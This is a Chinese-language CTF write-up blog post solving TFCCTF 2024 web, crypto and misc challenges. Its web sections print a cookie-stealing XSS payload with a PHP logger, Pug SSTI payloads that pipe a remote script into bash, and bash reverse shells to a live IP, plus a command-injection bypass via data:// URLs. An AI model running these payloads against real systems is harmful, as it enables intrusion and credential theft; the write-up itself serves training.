<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TFCCTF2024&amp;CrewCTF2024 | HvAng's Nests</title><meta name="author" content="HvAng"><meta name="copyright" content="HvAng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="TFCCTF https:&#x2F;&#x2F;ctf.thefewchosen.com  Web  GREETINGS 一开始感觉可以xss，因为body标签可以用 &lt;body onload&#x3D;alert(&#96;ls&#96;);&gt; 然后，在vps上放置一个xss.php &lt;?php$cookie &#x3D; $_GET[&#x27;cookie&#x27;];$log &#x3D; fopen(&quot;cookie.t">
<meta property="og:type" content="article">
<meta property="og:title" content="TFCCTF2024&amp;CrewCTF2024">
<meta property="og:url" content="https://hvang10.github.io/2024/08/05/TFCCTF2024-CrewCTF2024/index.html">
<meta property="og:site_name" content="HvAng&#39;s Nests">
<meta property="og:description" content="TFCCTF https:&#x2F;&#x2F;ctf.thefewchosen.com  Web  GREETINGS 一开始感觉可以xss，因为body标签可以用 &lt;body onload&#x3D;alert(&#96;ls&#96;);&gt; 然后，在vps上放置一个xss.php &lt;?php$cookie &#x3D; $_GET[&#x27;cookie&#x27;];$log &#x3D; fopen(&quot;cookie.t">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hvang10.github.io/img/favicon.png">
<meta property="article:published_time" content="2024-08-04T18:57:52.000Z">
<meta property="article:modified_time" content="2024-11-30T17:31:04.509Z">
<meta property="article:author" content="HvAng">
<meta property="article:tag" content="Web-learn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hvang10.github.io/img/favicon.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hvang10.github.io/2024/08/05/TFCCTF2024-CrewCTF2024/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'TFCCTF2024&CrewCTF2024',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-12-01 01:31:04'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="HvAng's Nests" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picx.zhimg.com/80/v2-58d0f84fe61e154aa6095a9cbe2b1b7a_1440w.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="HvAng's Nests"><span class="site-name">HvAng's Nests</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">TFCCTF2024&amp;CrewCTF2024</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-08-04T18:57:52.000Z" title="Created 2024-08-05 02:57:52">2024-08-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-30T17:31:04.509Z" title="Updated 2024-12-01 01:31:04">2024-12-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>11mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TFCCTF2024&amp;CrewCTF2024"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="tfcctf"><a class="markdownIt-Anchor" href="#tfcctf"></a> TFCCTF</h1>
<p><a target="_blank" rel="noopener" href="https://ctf.thefewchosen.com">https://ctf.thefewchosen.com</a></p>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="greetings"><a class="markdownIt-Anchor" href="#greetings"></a> GREETINGS</h3>
<p>一开始感觉可以<code>xss</code>，因为<code>body</code>标签可以用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;body onload=<span class="title function_">alert</span>(<span class="string">`ls`</span>);&gt;</span><br></pre></td></tr></table></figure>
<p>然后，在<code>vps</code>上放置一个<code>xss.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>&lt;body onload=&quot;window.location.href='http://8.138.168.65/xss.php?cookie='+document.cookie&quot;&gt;</code><br />
一试，没鬼用，莫得反应，那就不是<code>xss</code>喽</p>
<p>群里的师傅做出来了，Orz，是<code>pug ssti</code>，一开始也注意到了<code>X-Powered-By: Express</code>，<code>Express</code>是<code>node.js</code>的<code>Web</code>框架的一种，而<code>Express</code>框架中最常用的两个视图引擎是<code>Pug</code>和<code>EJS</code>，这个确实没怎么接触</p>
<p>测试发现<code>%23&#123;7*7&#125;</code>，可以被解析为<code>49</code>，确定为<code>pug ssti</code><br />
师傅给了一篇参考文章<br />
<a target="_blank" rel="noopener" href="https://www.hackingloops.com/ssti-in-pug/">https://www.hackingloops.com/ssti-in-pug/</a></p>
<p><code>payload大全</code><br />
<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%23&#123;<span class="function"><span class="title">function</span></span>()&#123;localLoad=global.process.mainModule.constructor._load;sh=localLoad(<span class="string">&quot;child_process&quot;</span>).<span class="built_in">exec</span>(<span class="string">&#x27;curl 8.138.168.65:443/bash.html | bash&#x27;</span>)&#125;()&#125;</span><br><span class="line"></span><br><span class="line">%23&#123;<span class="function"><span class="title">function</span></span>()&#123;localLoad=global.process.mainModule.constructor._load;sh=localLoad(<span class="string">&quot;child_process&quot;</span>).<span class="built_in">exec</span>(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.138.168.65/443 0&gt;&amp;1&quot;&#x27;</span>)&#125;()&#125;</span><br></pre></td></tr></table></figure>
<p><code>payload1</code>，在自己的<code>vps</code>的<code>/var/www/html</code>，新建了<code>bash.html</code>，内容为<code>bash -i &gt;&amp; /dev/tcp/8.138.168.65/443 0&gt;&amp;1</code><br />
前提是你的<code>vps</code>部署了部署<code>LNMP</code>环境(我的是阿里云ESC)，可参考官方文档<a target="_blank" rel="noopener" href="https://help.aliyun.com/zh/ecs/use-cases/build-an-lnmp-stack-on-a-ubuntu-instance?spm=a2c4g.11186623.0.i5#prereq-ljy-05c-i3m">https://help.aliyun.com/zh/ecs/use-cases/build-an-lnmp-stack-on-a-ubuntu-instance?spm=a2c4g.11186623.0.i5#prereq-ljy-05c-i3m</a><br />
<img src="https://picx.zhimg.com/80/v2-ad6204b95021d2a9bd31040500ce281c_1440w.png" alt="" /><br />
如果你的配置和我一样，请注意上图，要把<code>php7.4-fpm.sock</code>，改为<code>php8.1-fpm.sock</code>，反正我什么步骤都没错，就这里看漏眼了，没改，因为我们后面安装<code>php</code>的时候，安装的是<code>php8.1</code>，而<code>Nginx</code>默认的配置文件显示的是<code>7.4</code></p>
<p>然后，<code>payload2</code>的情况<br />
<img src="https://pica.zhimg.com/80/v2-80427321253c0bd4efd2316df3d55ec7_1440w.png" alt="" /><br />
不知道哪里出问题了</p>
<p>然后，反弹<code>shell</code>，也有免费的<code>vps</code>，具体使用体验我不清楚，反正我是自费的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://cat.flag.sh</span><br><span class="line">http://ceye.io/</span><br></pre></td></tr></table></figure>
<h3 id="safe_content"><a class="markdownIt-Anchor" href="#safe_content"></a> SAFE_CONTENT</h3>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isAllowedIP</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$allowedHost</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$parsedUrl</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$parsedUrl</span> || !<span class="keyword">isset</span>(<span class="variable">$parsedUrl</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$parsedUrl</span>[<span class="string">&#x27;host&#x27;</span>] === <span class="variable">$allowedHost</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fetchContent</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>([</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span> =&gt; [</span><br><span class="line">                <span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">5</span> // Timeout in seconds</span><br><span class="line">            ]</span><br><span class="line">        ]);</span><br><span class="line">        <span class="variable">$content</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$content</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="title function_ invoke__">error_get_last</span>();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Unable to fetch content from the URL. Error: &quot;</span> . <span class="variable">$error</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$allowedIP</span> = <span class="string">&#x27;localhost&#x27;</span>;       </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">isAllowedIP</span>(<span class="variable">$url</span>, <span class="variable">$allowedIP</span>)) &#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">fetchContent</span>(<span class="variable">$url</span>);</span><br><span class="line">            <span class="comment">// file upload removed due to security issues</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$content</span>) &#123;</span><br><span class="line">                <span class="variable">$command</span> = <span class="string">&#x27;echo &#x27;</span> . <span class="variable">$content</span> . <span class="string">&#x27; | base64 &gt; /tmp/&#x27;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="string">&#x27;.tfc&#x27;</span>;</span><br><span class="line">                <span class="title function_ invoke__">exec</span>(<span class="variable">$command</span> . <span class="string">&#x27; &gt; /dev/null 2&gt;&amp;1&#x27;</span>);</span><br><span class="line">                <span class="comment">// this should fix it</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>关注到这个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">fetchContent</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$command</span> = <span class="string">&#x27;echo &#x27;</span> . <span class="variable">$content</span> . <span class="string">&#x27; | base64 &gt; /tmp/&#x27;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="string">&#x27;.tfc&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$command</span> . <span class="string">&#x27; &gt; /dev/null 2&gt;&amp;1&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>exec</code>函数无回显，有<code>echo</code>通过反引号实现命令执行，我们可以直接反弹<code>shell</code></p>
<p>还有这个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetchContent</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>([</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span> =&gt; [</span><br><span class="line">                <span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">5</span> // Timeout in seconds</span><br><span class="line">            ]</span><br><span class="line">        ]);</span><br><span class="line">        <span class="variable">$content</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$content</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="title function_ invoke__">error_get_last</span>();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Unable to fetch content from the URL. Error: &quot;</span> . <span class="variable">$error</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>说明<code>$content</code>的内容需要经过<code>base64编码</code></p>
<p>And this</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAllowedIP</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$allowedHost</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$parsedUrl</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$parsedUrl</span> || !<span class="keyword">isset</span>(<span class="variable">$parsedUrl</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$parsedUrl</span>[<span class="string">&#x27;host&#x27;</span>] === <span class="variable">$allowedHost</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>parse_url — 解析 URL，返回其组成部分</code>，<code>$allowedIP = 'localhost';</code>说明<code>$url</code>的域名要等于<code>localhost</code></p>
<p>有不少关于它绕过的介绍，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lee-404/p/12826352.html">https://www.cnblogs.com/Lee-404/p/12826352.html</a></p>
<p>有这样的形式<code>://localhost</code>，我们很容易想到<code>php伪协议</code>中的，<code>data://text/plain,xxx</code></p>
<p>于是有了下面的<code>payload</code>，原来还能<code>data://localhost/text/plain</code>这样用，学到了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/8.138.168.65/443 0&gt;&amp;1&#x27;</span>`</span><br></pre></td></tr></table></figure>
<p><code>/?url=data://localhost/text/plain,payload</code>，payload是上面<code>base64编码后的结果</code></p>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="ccccc"><a class="markdownIt-Anchor" href="#ccccc"></a> CCCCC</h3>
<p><code>5c4c4c6c4c3c4c3c5c4c4c6c7cbc6c3c7c3c6c8c6cfc7c5c7c4c5cfc6c3c6cfc7c5c7c4c5cfc6c3c7c4c3c0c5cfc6c3c6cdc7c9c5cfc6c3c6c2c3c0c7c9c5cfc6c3c3c4c6cec6c4c5cfc6c3c6cdc7c9c5cfc6c3c6c4c6cfc6c7c5cfc6c3c6c1c6cec6c4c5cfc6c3c6cdc7c9c5cfc6c3c6c3c3c4c3c7c7cdc0ca</code><br />
很像16进制，但每两位都是以<code>c</code>结尾，把<code>c</code>去掉试试<br />
<code>5446434354467b6373686f75745f636f75745f6374305f636d795f636230795f63346e645f636d795f63646f675f63616e645f636d795f636334377d0a</code><br />
得到<code>TFCCTF&#123;cshout_cout_ct0_cmy_cb0y_c4nd_cmy_cdog_cand_cmy_cc47&#125;</code></p>
<h3 id="genetics"><a class="markdownIt-Anchor" href="#genetics"></a> GENETICS</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CCCA CACG CAAT CAAT CCCA CACG CTGT ATAC CCTT CTCT ATAC CGTA CGTA CCTT CGCT ATAT CTCA CCTT CTCA CGGA ATAC CTAT CCTT ATCA CTAT CCTT ATCA CCTT CTCA ATCA CTCA CTCA ATAA ATAA CCTT CCCG ATAT CTAG CTGC CCTT CTAT ATAA ATAA CGTG CTTC</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CCCACACGCAATCAATCCCACACGCTGTATACCCTTCTCTATACCGTACGTACCTTCGCTATATCTCACCTTCTCACGGAATACCTATCCTTATCACTATCCTTATCACCTTCTCAATCACTCACTCAATAAATAACCTTCCCGATATCTAGCTGCCCTTCTATATAAATAACGTGCTTC</span><br></pre></td></tr></table></figure>
<p>去掉空格，随波逐流，或者<code>ToolsFx</code>三位一组解密<br />
<code>vezdq2rgEZfFDZfSBf0Nm4rFDgGXC291C291x4q1DhqWmf0wm4j6x4mWmg60</code><br />
这个暂时不知道有没有解，md，真的工具用多了，下次再也不梭了</p>
<p><img src="https://picx.zhimg.com/80/v2-2a7bf8b897ab026614d466d7eec59c3c_1440w.png" alt="" /><br />
这次记住了，<code>ACGT</code>，作为一个物化地选手，老是记得是<code>ATCG</code>，觉得好顺口</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;CCCA CACG CAAT CAAT CCCA CACG CTGT ATAC CCTT CTCT ATAC CGTA CGTA CCTT CGCT ATAT CTCA CCTT CTCA CGGA ATAC CTAT CCTT ATCA CTAT CCTT ATCA CCTT CTCA ATCA CTCA CTCA ATAA ATAA CCTT CCCG ATAT CTAG CTGC CCTT CTAT ATAA ATAA CGTG CTTC&#x27;</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;00&#x27;</span>, <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;01&#x27;</span>, <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27; &#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    flag += <span class="built_in">dict</span>[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(flag[i:i+<span class="number">8</span>], <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="conway"><a class="markdownIt-Anchor" href="#conway"></a> CONWAY</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> generate_next_key, flag</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">initial = <span class="number">11131221131211131231121113112221121321132132211331222113112211</span></span><br><span class="line"></span><br><span class="line">initial = generate_next_key(initial)</span><br><span class="line"><span class="built_in">print</span>(initial)</span><br><span class="line"></span><br><span class="line">initial = generate_next_key(initial)</span><br><span class="line">h = hashlib.sha256()</span><br><span class="line">h.update(<span class="built_in">str</span>(initial).encode())</span><br><span class="line">key = h.digest()</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(cipher.encrypt(pad(flag.encode(),<span class="number">16</span>)).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 311311222113111231131112132112311321322112111312211312111322212311322113212221</span></span><br><span class="line"><span class="comment"># f143845f3c4d9ad024ac8f76592352127651ff4d8c35e48ca9337422a0d7f20ec0c2baf530695c150efff20bbc17ca4c</span></span><br></pre></td></tr></table></figure>
<p><code>conway Sequences</code>，康威序列，我们需要找题目所给的下一个<br />
<img src="https://picx.zhimg.com/80/v2-4e4ba6f311f0556ac7bc6e855a39ba7c_1440w.png" alt="" /></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">initial = <span class="number">132113213221133112132113311211131221121321131211132221123113112221131112311332111213211322211312113211</span></span><br><span class="line">h = hashlib.sha256()</span><br><span class="line">h.update(<span class="built_in">str</span>(initial).encode())</span><br><span class="line">key = h.digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">enc = <span class="number">0xf143845f3c4d9ad024ac8f76592352127651ff4d8c35e48ca9337422a0d7f20ec0c2baf530695c150efff20bbc17ca4c</span></span><br><span class="line"><span class="built_in">print</span>(cipher.decrypt(long_to_bytes(enc)))</span><br></pre></td></tr></table></figure>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="rules"><a class="markdownIt-Anchor" href="#rules"></a> RULES</h3>
<p><img src="https://picx.zhimg.com/80/v2-bb5082ec9f05b2d1b3de618d93004c3c_1440w.png" alt="" /></p>
<h3 id="discord-shenanigans-v4"><a class="markdownIt-Anchor" href="#discord-shenanigans-v4"></a> DISCORD SHENANIGANS V4</h3>
<p>机器人说了<code>flag</code>就在这里，但是你直接复制它的话是没有反应的<br />
选择右键复制，即可得到</p>
